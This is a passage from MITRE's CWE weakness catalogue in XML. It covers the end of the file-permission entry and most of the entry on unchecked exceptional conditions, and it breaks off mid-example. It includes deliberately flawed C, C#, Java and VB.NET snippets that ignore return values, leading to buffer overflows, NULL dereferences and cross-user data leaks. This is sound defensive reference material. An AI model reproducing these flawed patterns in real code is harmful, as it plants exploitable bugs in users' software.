               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 9, "File Permissions." Page 495.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-9" Local_Reference_ID="R.732.2">
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Author>Gary McGraw</Reference_Author>
               <Reference_Title>Building Secure Software: How to Avoid Security Problems the
						Right Way</Reference_Title>
               <Reference_Section>Chapter 8, "Access Control." Page 194.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison-Wesley</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.732.3">
               <Reference_Author>Jason Lam</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 21 - Incorrect Permission Assignment for
						Critical Response</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-24</Reference_Date>
               <Reference_Link>http://software-security.sans.org/blog/2010/03/24/top-25-series-rank-21-incorrect-permission-assignment-for-critical-response</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-24" Local_Reference_ID="R.732.4">
               <Reference_Author>NIST</Reference_Author>
               <Reference_Title>Federal Desktop Core Configuration</Reference_Title>
               <Reference_Link>http://nvd.nist.gov/fdcc/index.cfm</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Create files with appropriate access
						permission</Mapped_Node_Name>
               <Mapped_Node_ID>FIO03-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Do not allow tainted variables in privileged
						blocks</Mapped_Node_Name>
               <Mapped_Node_ID>SEC01-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Do not grant dangerous combinations of
						permissions</Mapped_Node_Name>
               <Mapped_Node_ID>ENV03-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Create files with appropriate access
						permissions</Mapped_Node_Name>
               <Mapped_Node_ID>FIO06-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Create files with appropriate access
						permissions</Mapped_Node_Name>
               <Mapped_Node_ID>FIO06-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>1</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>122</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>127</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>17</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>180</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>234</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>60</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>61</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>62</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submission_Date>2008-09-08</Submission_Date>
               <Submission_Comment>new weakness-focused entry for Research
						view.</Submission_Comment>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, Likelihood_of_Exploit, Name,
						Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences,
						Demonstrative_Examples, Detection_Factors, Modes_of_Introduction,
						Observed_Examples, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors,
						Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns,
						Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2009-01-12">Insecure Permission
						Assignment for Resource</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2009-05-27">Insecure Permission
						Assignment for Critical Resource</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="754" Name="Improper Check for Unusual or Exceptional Conditions" Weakness_Abstraction="Class" Status="Incomplete">
         <Description>
            <Description_Summary>The software does not check or improperly checks for unusual or
					exceptional conditions that are not expected to occur frequently during day to
					day operation of the software.</Description_Summary>
            <Extended_Description>
               <Text>The programmer may assume that certain events or conditions will never
						occur or do not need to be worried about, such as low memory conditions,
						lack of access to resources due to restrictive permissions, or misbehaving
						clients or components. However, attackers may intentionally trigger these
						unusual conditions, thus violating the programmer's assumptions, possibly
						introducing instability, incorrect behavior, or a vulnerability.</Text>
               <Text>Note that this entry is not exclusively about the use of exceptions and
						exception handling, which are mechanisms for both checking and handling
						unusual or unexpected conditions.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>802</Relationship_Target_ID>
               <!--2010 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>703</Relationship_Target_ID>
               <!--Improper Check or Handling of Exceptional Conditions--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>388</Relationship_Target_ID>
               <!--Error Handling--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>840</Relationship_Target_ID>
               <!--Business Logic Errors--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>876</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 08 - Memory Management (MEM)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>880</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 12 - Exceptions and Error Handling (ERR)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>742</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 08 - Memory Management (MEM)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>962</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Unchecked Status Condition--></Relationship>
         </Relationships>
         <Relationship_Notes>
            <Relationship_Note>
               <Text>Sometimes, when a return value can be used to indicate an error, an
						unchecked return value is a code-layer instance of a missing
						application-layer check for exceptional conditions. However, return values
						are not always needed to communicate exceptional conditions. For example,
						expiration of resources, values passed by reference, asynchronously modified
						data, sockets, etc. may indicate exceptional conditions without the use of a
						return value.</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
               <Text>Many functions will return some value about the success of their actions.
						This will alert the program whether or not to handle any errors caused by
						that function.</Text>
            </Background_Detail>
         </Background_Details>
         <Time_of_Introduction>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Unexpected state</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>The data which were produced as a result of a function call could be
							in a bad state upon return. If the return value is not checked, then
							this bad data may be used in operations, possibly leading to a crash or
							other unintended behaviors.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated static analysis may be useful for detecting unusual
							conditions involving system resources or common programming idioms, but
							not for violations of business rules.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-12">
               <Method_Name>Manual Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>Identify error conditions that are not likely to occur during normal
							usage and trigger them. For example, run the program under low memory
							conditions, run with insufficient privileges or permissions, interrupt a
							transaction before it is completed, or disable connectivity to basic
							network services such as DNS. Monitor the software for any unexpected
							behavior. If you trigger an unhandled exception or similar error that
							was discovered and handled by the application's environment, it may
							still indicate unexpected conditions that were not handled by the
							application itself.</Text>
               </Method_Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-3">
               <Mitigation_Phase>Requirements</Mitigation_Phase>
               <Mitigation_Strategy>Language Selection</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a language that does not allow this weakness to occur or provides
							constructs that make this weakness easier to avoid.</Text>
                  <Text>Choose languages with features such as exception handling that force
							the programmer to anticipate unusual conditions that may generate
							exceptions. Custom exceptions may need to be developed to handle unusual
							business-logic conditions. Be careful not to pass sensitive exceptions
							back to the user (CWE-209, CWE-248).</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Check the results of all functions that return a value and verify that
							the value is expected.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>High</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text> Checking the return value of the function will typically be
							sufficient, however beware of race conditions (CWE-362) in a concurrent
							environment. </Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>If using exception handling, catch and throw specific exceptions
							instead of overly-general exceptions (CWE-396, CWE-397). Catch and
							handle exceptions as locally as possible so that exceptions do not
							propagate too far up the call stack (CWE-705). Avoid unchecked or
							uncaught exceptions where feasible (CWE-248).</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>High</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text> Using specific exceptions, and ensuring that exceptions are checked,
							helps programmers to anticipate and appropriately handle many unusual
							events that could occur.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Ensure that error messages only contain minimal details that are
							useful to the intended audience, and nobody else. The messages need to
							strike the balance between being too cryptic and not being cryptic
							enough. They should not necessarily reveal the methods that were used to
							determine the error. Such detailed information can be used to refine the
							original attack to increase the chances of success.</Text>
                  <Text>If errors must be tracked in some detail, capture them in log messages
							- but consider what could occur if the log messages can be viewed by
							attackers. Avoid recording highly sensitive information such as
							passwords in any form. Avoid inconsistent messaging that might
							accidentally tip off an attacker about internal state, such as whether a
							username is valid or not.</Text>
                  <Text>Exposing additional information to a potential attacker in the context
							of an exceptional condition can help the attacker determine what attack
							vectors are most likely to succeed beyond DoS.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Assume all input is malicious. Use an "accept known good" input
							validation strategy, i.e., use a whitelist of acceptable inputs that
							strictly conform to specifications. Reject any input that does not
							strictly conform to specifications, or transform it into something that
							does.</Text>
                  <Text>When performing input validation, consider all potentially relevant
							properties, including length, type of input, the full range of
							acceptable values, missing or extra inputs, syntax, consistency across
							related fields, and conformance to business rules. As an example of
							business rule logic, "boat" may be syntactically valid because it only
							contains alphanumeric characters, but it is not valid if the input is
							only expected to contain colors such as "red" or "blue."</Text>
                  <Text>Do not rely exclusively on looking for malicious or malformed inputs
							(i.e., do not rely on a blacklist). A blacklist is likely to miss at
							least one undesirable input, especially if the code's environment
							changes. This can give attackers enough room to bypass the intended
							validation. However, blacklists can be useful for detecting potential
							attacks or determining which inputs are so malformed that they should be
							rejected outright.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness_Notes>
                  <Text>Performing extensive input validation does not help with handling
							unusual conditions, but it will minimize their occurrences and will make
							it more difficult for attackers to trigger them. </Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-38">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>If the program must fail, ensure that it fails gracefully (fails
							closed). There may be a temptation to simply let the program fail poorly
							in cases such as low memory conditions, but an attacker may be able to
							assert control before the software has fully exited. Alternately, an
							uncontrolled failure could cause cascading problems with other
							downstream components; for example, the program could send a signal to a
							downstream process so the process immediately knows that a problem has
							occurred and has a better chance of recovery.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use system limits, which should help to prevent resource exhaustion.
							However, the software should still handle low resource conditions since
							they may still occur.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-7">
               <Intro_Text>Consider the following code segment:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>char buf[10], cp_buf[10];</Code>
                     <Code>fgets(buf, 10, stdin);</Code>
                     <Code>strcpy(cp_buf, buf);</Code>
                  </Block>
                  <Text>The programmer expects that when fgets() returns, buf will contain a
							null-terminated string of length 9 or less. But if an I/O error occurs,
							fgets() will not null-terminate buf. Furthermore, if the end of the file
							is reached before any characters are read, fgets() returns without
							writing anything to buf. In both of these situations, fgets() signals
							that something unusual has happened by returning NULL, but in this code,
							the warning will not be noticed. The lack of a null terminator in buf
							can result in a buffer overflow in the subsequent call to strcpy().
						</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-8">
               <Intro_Text>The following code does not check to see if memory allocation
						succeeded before attempting to use the pointer returned by
						malloc().</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>buf = (char*) malloc(req_size);</Code>
                     <Code>strncpy(buf, xfer, req_size);</Code>
                  </Block>
                  <Text>The traditional defense of this coding error is: "If my program runs
							out of memory, it will fail. It doesn't matter whether I handle the
							error or simply allow the program to die with a segmentation fault when
							it tries to dereference the null pointer." This argument ignores three
							important considerations:</Text>
                  <Block Block_Nature="List">
                     <Text>Depending upon the type and size of the application, it may be
								possible to free memory that is being used elsewhere so that
								execution can continue.</Text>
                     <Text>It is impossible for the program to perform a graceful exit if
								required. If the program is performing an atomic operation, it can
								leave the system in an inconsistent state.</Text>
                     <Text> The programmer has lost the opportunity to record diagnostic
								information. Did the call to malloc() fail because req_size was too
								large or because there were too many requests being handled at the
								same time? Or was it caused by a memory leak that has built up over
								time? Without handling the error, there is no way to know.</Text>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-9">
               <Intro_Text>The following examples read a file into a byte array.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C#</Code_Example_Language>
                     <Code>char[] byteArray = new char[1024];</Code>
                     <Code>for (IEnumerator i=users.GetEnumerator(); i.MoveNext()
								;i.Current()) {</Code>
                     <Block>
                        <Code>String userName = (String) i.Current();</Code>
                        <Code>String pFileName = PFILE_ROOT + "/" + userName;</Code>
                        <Code>StreamReader sr = new StreamReader(pFileName);</Code>
                        <Code>sr.Read(byteArray,0,1024);//the file is always 1k bytes</Code>
                        <Code>sr.Close();</Code>
                        <Code>processPFile(userName, byteArray);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>FileInputStream fis;</Code>
                     <Code>byte[] byteArray = new byte[1024];</Code>
                     <Code>for (Iterator i=users.iterator(); i.hasNext();) {</Code>
                     <Block>
                        <Code>String userName = (String) i.next();</Code>
                        <Code>String pFileName = PFILE_ROOT + "/" + userName;</Code>
                        <Code>FileInputStream fis = new FileInputStream(pFileName);</Code>
                        <Code>fis.read(byteArray); // the file is always 1k bytes</Code>
                        <Code>fis.close();</Code>
                        <Code>processPFile(userName, byteArray);</Code>
                        <Code/>
                     </Block>
                  </Block>
                  <Text>The code loops through a set of users, reading a private data file for
							each user. The programmer assumes that the files are always 1 kilobyte
							in size and therefore ignores the return value from Read(). If an
							attacker can create a smaller file, the program will recycle the
							remainder of the data from the previous user and treat it as though it
							belongs to the attacker.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-10">
               <Intro_Text>The following code does not check to see if the string returned by
						getParameter() is null before calling the member function compareTo(),
						potentially causing a NULL dereference.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>String itemName = request.getParameter(ITEM_NAME);</Code>
                     <Code>if (itemName.compareTo(IMPORTANT_ITEM) == 0) {</Code>
                     <Block>
                        <Code>...</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>...</Code>
                  </Block>
                  <Text>The following code does not check to see if the string returned by the
							Item property is null before calling the member function Equals(),
							potentially causing a NULL dereference. </Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>String itemName = request.Item(ITEM_NAME);</Code>
                     <Code>if (itemName.Equals(IMPORTANT_ITEM)) {</Code>
                     <Block>
                        <Code>...</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>...</Code>
                  </Block>
                  <Text>The traditional defense of this coding error is: "I know the requested
							value will always exist because.... If it does not exist, the program
							cannot perform the desired behavior so it doesn't matter whether I
							handle the error or simply allow the program to die dereferencing a null
							value." But attackers are skilled at finding unexpected paths through
							programs, particularly when exceptions are involved.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-11">
               <Intro_Text>The following code shows a system property that is set to null and
						later dereferenced by a programmer who mistakenly assumes it will always be
						defined.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>System.clearProperty("os.name");</Code>
                     <Code>...</Code>
                     <Code>String os = System.getProperty("os.name");</Code>
                     <Code>if (os.equalsIgnoreCase("Windows 95")) System.out.println("Not
								supported");</Code>
                  </Block>
                  <Text>The traditional defense of this coding error is: "I know the requested
							value will always exist because.... If it does not exist, the program
							cannot perform the desired behavior so it doesn't matter whether I
							handle the error or simply allow the program to die dereferencing a null
							value." But attackers are skilled at finding unexpected paths through
							programs, particularly when exceptions are involved.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-12">
               <Intro_Text>The following VB.NET code does not check to make sure that it has
						read 50 bytes from myfile.txt. This can cause DoDangerousOperation() to
						operate on an unexpected value.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>.NET</Code_Example_Language>
                     <Code>Dim MyFile As New FileStream("myfile.txt", FileMode.Open,
								FileAccess.Read, FileShare.Read)</Code>
                     <Code>Dim MyArray(50) As Byte</Code>
                     <Code>MyFile.Read(MyArray, 0, 50)</Code>
                     <Code>DoDangerousOperation(MyArray(20))</Code>
                  </Block>
                  <Text>In .NET, it is not uncommon for programmers to misunderstand Read()
							and related methods that are part of many System.IO classes. The stream
							and reader classes do not consider it to be unusual or exceptional if
							only a small amount of data becomes available. These classes simply add
							the small amount of data to the return buffer, and set the return value
							to the number of bytes or characters read. There is no guarantee that
							the amount of data returned is equal to the amount of data requested.
						</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-1">
               <Intro_Text>This example takes an IP address from a user, verifies that it is
						well formed and then looks up the hostname and copies it into a
						buffer.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>void host_lookup(char *user_supplied_addr){</Code>
                     <Block>
                        <Code>struct hostent *hp;</Code>
                        <Code>in_addr_t *addr;</Code>
                        <Code>char hostname[64];</Code>
                        <Code>in_addr_t inet_addr(const char *cp);</Code>
                        <Code/>
                        <Comment>/*routine that ensures user_supplied_addr is in the right
									format for conversion */</Comment>
                        <Code>validate_addr_form(user_supplied_addr);</Code>
                        <Code>addr = inet_addr(user_supplied_addr);</Code>
                        <Code>hp = gethostbyaddr( addr, sizeof(struct in_addr),
									AF_INET);</Code>
                        <Code>strcpy(hostname, hp-&gt;h_name);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>If an attacker provides an address that appears to be well-formed, but
							the address does not resolve to a hostname, then the call to
							gethostbyaddr() will return NULL. When this occurs, a NULL pointer
							dereference (CWE-476) will occur in the call to strcpy().</Text>
                  <Text>Note that this example is also vulnerable to a buffer overflow (see
							CWE-119).</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text> In the following C/C++ example the method outputStringToFile opens
						a file in the local filesystem and outputs a string to the file. The input
						parameters output and filename contain the string to output to the file and
						the name of the file respectively. </Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Code>int outputStringToFile(char *output, char *filename) {</Code>
                     <Block>
                        <Code/>
                        <Code>openFileToWrite(filename);</Code>
                        <Code>writeToFile(output);</Code>
                        <Code>closeFile(filename);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>However, this code does not check the return values of the methods
							openFileToWrite, writeToFile, closeFile to verify that the file was
							properly opened and closed and that the string was successfully written
							to the file. The return values for these methods should be checked to
							determine if the method was successful and allow for detection of errors
							or unexpected conditions as in the following example.</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Code>int outputStringToFile(char *output, char *filename) {</Code>
                     <Block>
                        <Code>int isOutput = SUCCESS;</Code>
                        <Code/>
